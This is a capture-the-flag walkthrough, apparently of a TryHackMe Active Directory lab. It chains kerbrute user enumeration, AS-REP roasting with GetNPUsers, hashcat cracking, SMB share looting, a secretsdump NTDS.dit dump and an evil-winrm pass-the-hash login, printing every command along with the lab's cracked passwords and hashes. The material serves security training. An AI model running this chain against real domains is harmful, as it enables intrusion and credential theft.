**Target** - `10.10.171.16`

***
I'll first start by running an ==nmap== scan to enumerate open ports and versions

`nmap -sV -sC 10.10.171.16`

Results:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 23:45 EDT
Nmap scan report for 10.10.171.16
Host is up (0.018s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 03:45:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-21T03:45:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-05-20T03:40:08
|_Not valid after:  2025-11-19T03:40:08
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-21T03:45:50+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-21T03:45:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
```

We can also use enum4linux to enumerate NetBIOS SMB/SAMBA
`enum4linux -U -o 10.10.171.16`

**NetBIOS-Domain Name of The Machine** - `THM-AD` located in the NMAP scan:
```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-21T03:45:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-05-20T03:40:08
|_Not valid after:  2025-11-19T03:40:08
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-21T03:45:50+00:00
```
==.local== is an invalid TLD because it's not globally unique or routable.

***

We can see that Kerberos is open (TCP 88)
`88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 `

Let's enumerate it with ==Kerbrute==. I'll use the provided User List and Password List.
`go install github.com/ropnop/kerbrute@latest`


I'll run:
`kerbrute userenum -d THM-AD --dc 10.10.171.16 '/home/kali/Documents/A/userlist.txt'`
- `-d` - domain name
- `--dc` - domain controller 

Results:
```bash
2025/05/21 00:04:35 >  [+] VALID USERNAME:       james@THM-AD
2025/05/21 00:04:35 >  [+] VALID USERNAME:       svc-admin@THM-AD
2025/05/21 00:04:36 >  [+] VALID USERNAME:       James@THM-AD
2025/05/21 00:04:36 >  [+] VALID USERNAME:       robin@THM-AD
2025/05/21 00:04:38 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/05/21 00:04:39 >  [+] VALID USERNAME:       administrator@THM-AD
2025/05/21 00:04:45 >  [+] VALID USERNAME:       backup@THM-AD
2025/05/21 00:04:46 >  [+] VALID USERNAME:       paradox@THM-AD
2025/05/21 00:04:57 >  [+] VALID USERNAME:       JAMES@THM-AD
2025/05/21 00:05:00 >  [+] VALID USERNAME:       Robin@THM-AD
2025/05/21 00:05:20 >  [+] VALID USERNAME:       Administrator@THM-AD

```
Notable accounts: `svc-admin@THM-AD`, `backup@THM-AD`

***

# Exploitation

# Retrieving Kerberos Tickets
We'll use ==Impacket's== tool called ==GetNPUsers.py==
- Retrieve domain users who have "Don't require Kerberos preauthentication" set and ask for their TGTs without knowing the password

**Targets** - `svc-admin@THM-AD`, `backup@THM-AD`
I will place these two users in a `.txt` file like:
```
svc-admin
backup
```

and then run
`python3 GetNPUsers.py spookysec.local/ -usersfile /home/kali/Documents/A/targetusers.txt -dc-ip 10.10.171.16 -dc-host THM-AD`

Results:
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7bb613fbc20d5367449e918e59b8d469$8d0f5633ccdd01e672659e8727883a5b16b1130455e4d5c95f837b2b58cafb538db39dd49cdb478ed6320f77a7deb0be2a17607066460e24c201e40e469f28855dcc1f3169175970b3e3b3da5d5b14a7dad7871e319257a4fdd89c7e476a9c6622c5aad1e242cc00065e81f52b9b6047fbe077ffd330d2855cb6dff41bbf61d1ba0cdaa7649ecfc109ae8b27c850f549d00999587a50d27c73488b46841a46d8ce5f8527a04be0260d3952c7776b2766810379c5ad97450c42b95516ad54eacd44ab8dbf53268f750a9569d6258bb5920da27971aa046db9144a08f0ce949c3c69b58dc2c212ed3aa66bd38384e96e78b3a5
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Let's look at: https://hashcat.net/wiki/doku.php?id=example_hashes to figure out what hash we have.
![Pasted image 20250521052015](https://github.com/user-attachments/assets/a787e9bb-3a99-435d-a4f0-2f65de5aa81c)

`Kerberos 5, etype 23, AS-REP`
`18200`

I will place the hash in a file and crack it with the provided wordlist.

`hashcat -m 18200 '/home/kali/Documents/A/hash' '/home/kali/Documents/A/passwordlist.txt'`

==CRACKED!==
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7bb613fbc20d5367449e918e59b8d469$8d0f5633ccdd01e672659e8727883a5b16b1130455e4d5c95f837b2b58cafb538db39dd49cdb478ed6320f77a7deb0be2a17607066460e24c201e40e469f28855dcc1f3169175970b3e3b3da5d5b14a7dad7871e319257a4fdd89c7e476a9c6622c5aad1e242cc00065e81f52b9b6047fbe077ffd330d2855cb6dff41bbf61d1ba0cdaa7649ecfc109ae8b27c850f549d00999587a50d27c73488b46841a46d8ce5f8527a04be0260d3952c7776b2766810379c5ad97450c42b95516ad54eacd44ab8dbf53268f750a9569d6258bb5920da27971aa046db9144a08f0ce949c3c69b58dc2c212ed3aa66bd38384e96e78b3a5:management2005

```

***

With these credentials, we can access more within the domain.

Let's enumerate any shares with ==smbclient==
`smbclient -L spookysec.local -I 10.10.171.16 -U svc-admin
`
and then enter `management2005`

Results:
```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

```

Let's list the content of `backup`

`smbclient //spookysec.local/backup -I 10.10.171.16 -U svc-admin`
```
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
8247551 blocks of size 4096. 3586263 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> 
```

Contents of the file: `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw `
```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d 
backup@spookysec.local:backup2517860  
```

Let's run ==secretsdump.py== on the backup user.
`secretsdump.py spookysec.local/backup:backup2517860'@10.10.171.16 -just-dc`

```
Impacket v0.13.0.dev0+20250516.105908.a63c6522 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:90ba7503a9f2f8044669f6a57e54057c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:2c411cff509b56d757ff21ab4e7186d40305b706b8bad19db491220b2ab1d65d
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:6828a73c84cd97967aa1a94d91e2247f
ATTACKTIVEDIREC$:des-cbc-md5:01c2070468329eda
```
- Dumps ==NTDS.dit==
	- Every user secret that is stored

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::`
**Administrator NTLM Hash:** `0e0363213e37b94221497260b0bcb4fc`

We can perform a ==pass the hash== attack using the administrator hash. I will be using ==Evil-WinRM==

`evil-winrm -i 10.10.171.16 -u administrator -H 0e0363213e37b94221497260b0bcb4fc `
![Pasted image 20250521055928](https://github.com/user-attachments/assets/11a3df01-e4ac-4db8-afe7-d133bcc0c9aa)

Easy flag!
